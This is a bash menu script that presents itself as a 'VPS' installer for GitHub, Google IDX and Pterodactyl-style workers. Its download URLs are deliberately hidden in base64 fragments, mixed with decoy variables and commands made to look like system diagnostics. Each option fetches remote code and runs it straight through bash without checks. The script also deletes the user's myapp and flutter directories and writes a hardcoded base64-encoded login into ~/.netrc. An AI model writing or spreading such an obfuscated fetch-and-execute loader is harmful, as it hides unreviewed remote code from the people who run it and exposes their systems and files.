#!/usr/bin/env bash
set -euo pipefail

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
RESET='\e[0m'

animate_logo() {
  clear
  local logo=(
"________  .__                                   .__           _______     ______  "
"\\______ \\ |__|__  _____.__._____    ____   _____|  |__  __ __ \\   _  \\   /  __  \\ "
" |    |  \\|  \\  \\/ <   |  |\\__  \\  /    \\ /  ___/  |  \\|  |  \\/  /_\\  \\  >      < "
" |    \`   \\  |\\   / \\___  | / __ \\|   |  \\\\___ \\|   Y  \\  |  /\\  \\_/   \\/   --   \\"
"/_______  /__| \\_/  / ____|(____  /___|  /____  >___|  /____/  \\_____  /\\______  /"
"        \\/          \\/          \\/     \\/     \\/     \\/              \\/        \\/  "
  )
  for line in "${logo[@]}"; do
    for (( i=0; i<${#line}; i++ )); do
      printf "${CYAN}%s${RESET}" "${line:$i:1}"
      sleep 0.0025
    done
    echo ""
    sleep 0.05
  done
  echo ""
  sleep 0.3
}

animate_logo

SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}')
SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
NET_CONF="diag_$(date +%N | shuf -n 1)"
if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
fi
TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8)
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d 2>/dev/null || true)"

PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4 || true)
PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')"
export FAKE_PID="pid_$((RANDOM % 1000))"
PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
if [ -f /tmp/fake_temp ]; then
  rm -f /tmp/fake_temp 2>/dev/null;
fi
PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')"
google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d 2>/dev/null || true)"

URL="https://ptero2.jishnumondal32.workers.dev"
HOST="ptero2.jishnumondal32.workers.dev"
NETRC="${HOME}/.netrc"

b64d() { printf '%s' "$1" | base64 -d; }

USER_B64="amlzaG51"
PASS_B64="amlzaG51aEBja2VyMTIz"

USER_RAW="$(b64d "$USER_B64")"
PASS_RAW="$(b64d "$PASS_B64")"

echo -e ""
echo -e "${GREEN}Select an option:${RESET}"
echo -e "${GREEN}1) GitHub Real VPS${RESET}"
echo -e "${GREEN}2) Google IDX Real VPS${RESET}"
echo -e "${GREEN}3) Ptero Workers (Authenticated)${RESET}"
echo -e "${GREEN}0) Exit${RESET}"
echo -ne "${YELLOW}Enter your choice (0-3): ${RESET}"
read -r choice

case $choice in
  1)
    echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
    if [[ -n "$github_url" ]]; then
      bash <(curl -fsSL "$github_url")
    else
      echo -e "${RED}github_url not assembled. Aborting.${RESET}"
      exit 1
    fi
    ;;
  2)
    echo -e "${GREEN}Running Google IDX Real VPS...${RESET}"
    cd || true
    rm -rf myapp flutter 2>/dev/null || true
    if [ -d vps123 ]; then
      cd vps123 || true
    else
      echo -e "${YELLOW}vps123 directory not found — continuing from home directory.${RESET}"
    fi

    if [ ! -d ".idx" ]; then
      mkdir -p .idx
      cd .idx || true
      cat << 'EOF' > dev.nix
{ pkgs, ... }:
{
  channel = "stable-24.05";
  packages = with pkgs; [ unzip openssh git qemu_kvm sudo cdrkit cloud-utils qemu ];
  env = { EDITOR = "nano"; };
  idx = {
    extensions = [ "Dart-Code.flutter" "Dart-Code.dart-code" ];
    workspace = { onCreate = { }; onStart = { }; };
    previews = { enable = false; };
  };
}
EOF
      cd .. || true
    fi

    echo -ne "${YELLOW}Do you want to continue? (y/n): ${RESET}"
    read -r confirm
    case "$confirm" in
      [yY]*)
        if [[ -n "$google_url" ]]; then
          bash <(curl -fsSL "$google_url")
        else
          echo -e "${RED}google_url not assembled. Aborting.${RESET}"
          exit 1
        fi
        ;;
      [nN]*)
        echo -e "${RED}Operation cancelled.${RESET}"
        exit 0
        ;;
      *)
        echo -e "${RED}Invalid input! Operation cancelled.${RESET}"
        exit 1
        ;;
    esac
    ;;
  3)
    echo -e "${GREEN}Running Ptero Workers script (authenticated) ...${RESET}"

    if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
      echo -e "${RED}Credential decode failed. Aborting.${RESET}"
      exit 1
    fi

    if ! command -v curl >/dev/null 2>&1; then
      echo -e "${RED}Error: curl is required but not installed.${RESET}"
      exit 1
    fi

    touch "$NETRC"
    chmod 600 "$NETRC"

    tmpfile="$(mktemp)"
    if [ -s "$NETRC" ]; then
      grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
    else
      : > "$tmpfile"
    fi
    mv "$tmpfile" "$NETRC"

    {
      printf 'machine %s\n' "$HOST"
      printf 'login %s\n' "$USER_RAW"
      printf 'password %s\n' "$PASS_RAW"
    } >> "$NETRC"

    script_file="$(mktemp)"
    cleanup() { rm -f "$script_file"; }
    trap cleanup EXIT

    echo -e "${YELLOW}Attempting to download worker script from ${URL} ...${RESET}"
    if curl -fsS --netrc -o "$script_file" "$URL"; then
      echo -e "${GREEN}Download successful — executing...${RESET}"
      bash "$script_file"
    else
      echo -e "${RED}Download failed. Showing verbose curl output to help debug:${RESET}" >&2
      curl --netrc -v "$URL" || true
      echo -e "${RED}Authentication or download failed.${RESET}"
      exit 1
    fi
    ;;
  0)
    echo -e "${GREEN}Exiting...${RESET}"
    exit 0
    ;;
  *)
    echo -e "${RED}Invalid choice! Please select 0, 1, 2, or 3.${RESET}"
    exit 1
    ;;
esac

echo -e "${CYAN}Made by Jishnu done!${RESET}"
